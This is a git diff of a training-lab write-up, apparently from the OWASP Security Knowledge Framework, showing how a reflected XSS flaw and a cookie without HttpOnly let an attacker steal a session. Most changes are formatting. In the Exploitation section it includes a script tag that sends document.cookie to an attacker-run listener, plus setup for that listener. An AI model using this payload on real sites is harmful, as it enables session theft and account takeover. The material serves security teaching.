@@ -1,12 +1,12 @@
-# KBID 39 - HttpOnly Session hijacking
+# KBID 39 - HttpOnly session hijacking XSS
 
 ## Running the app
 
-```text
+```
 $ sudo docker pull blabla1337/owasp-skf-lab:session-hijacking-xss
 ```
 
-```text
+```
 $ sudo docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:session-hijacking-xss
 ```
 
@@ -20,9 +20,7 @@ This exercise does not work for chrome!
 
 ## Running the app Python3
 
-First, make sure python3 and pip are installed on your host machine.
-After installation, we go to the folder of the lab we want to practise 
-"i.e /skf-labs/XSS/, /skf-labs/jwt-secret/ " and run the following commands:
+First, make sure python3 and pip are installed on your host machine. After installation, we go to the folder of the lab we want to practise "i.e /skf-labs/XSS/, /skf-labs/jwt-secret/ " and run the following commands:
 
 ```
 $ pip3 install -r requirements.txt
@@ -33,30 +31,27 @@ $ python3 <labname>
 ```
 
 {% hint style="success" %}
- Now that the app is running let's go hacking!
+Now that the app is running let's go hacking!
 {% endhint %}
-
 
 ![Docker Image and write-up thanks to ContraHack!](.gitbook/assets/screen-shot-2019-03-04-at-21.33.32.png)
 
 ## Reconnaissance
 
-The attacker can compromise the session token by using malicious code or programs running at the client-side. The example shows how the attacker could use an XSS attack to steal the session token. 
+The attacker can compromise the session token by using malicious code or programs running at the client-side. The example shows how the attacker could use an XSS attack to steal the session token.
 
 Because the server keeps track of the current authenticated user by means of the value of the session cookie, whenever this session cookie gets compromised an attacker is able to impersonate this user by changing his current session cookie with the compromised session cookie in his browsers session storage.
 
 Lets start the application and login with the default credentials.
 
 {% hint style="info" %}
-username : admin  
+username : admin\
 password: admin
 {% endhint %}
 
 ![](.gitbook/assets/session-hijacking-xss-1.png)
 
-After authenticating to the server we can see that the user has a text-area
-field at his dissposal to insert user input. When we press submit we find that
-this user supplied input is being reflected on the side of the client. This is a perfect indicator that we might want to start testing for cross site scripting attacks. 
+After authenticating to the server we can see that the user has a text-area field at his dissposal to insert user input. When we press submit we find that this user supplied input is being reflected on the side of the client. This is a perfect indicator that we might want to start testing for cross site scripting attacks.
 
 {% hint style="info" %}
 Refer to the XSS labs for more information how to test!
@@ -78,11 +73,11 @@ Now, we can inject the a piece of malicious javascript to see if we can prompt a
 
 ## Exploitation
 
-Now that we have determined that we can 
+Now that we have determined that we can
 
-1) inject malicious javascript
+1\) inject malicious javascript
 
-2) The HttpOnly attribute is not set for the session cookie
+2\) The HttpOnly attribute is not set for the session cookie
 
 We can start building our malicious payload and hijack the session information to our malicious webserver.
 
@@ -101,9 +96,9 @@ if __name__ == "__main__":
     app.run(host='0.0.0.0', port=1337)
 ```
 
-Save the snippet above to &gt; app.py and run the commands below to install some dependencies.
+Save the snippet above to > app.py and run the commands below to install some dependencies.
 
-```text
+```
 $ pip install flask
 $ pip install requests
 $ python app.py
@@ -115,7 +110,7 @@ Now that the service is running we want to inject the malicious piece of javascr
 
 ![](.gitbook/assets/session-hijacking-xss-5.png)
 
-```html
+```markup
 <script>new Image().src="http://localhost:1337/?stolen_cookie="+document.cookie;</script>
 ```
 
@@ -123,5 +118,4 @@ After injecting the malicious javascript in the text-area field we see the follo
 
 ![](.gitbook/assets/session-hijacking-xss-6.png)
 
-The attacker can now change the session cookie value in his browers console by the session cookie that we hijacked with our malicous payload to "hijack" the victims account. 
-
+The attacker can now change the session cookie value in his browers console by the session cookie that we hijacked with our malicous payload to "hijack" the victims account.
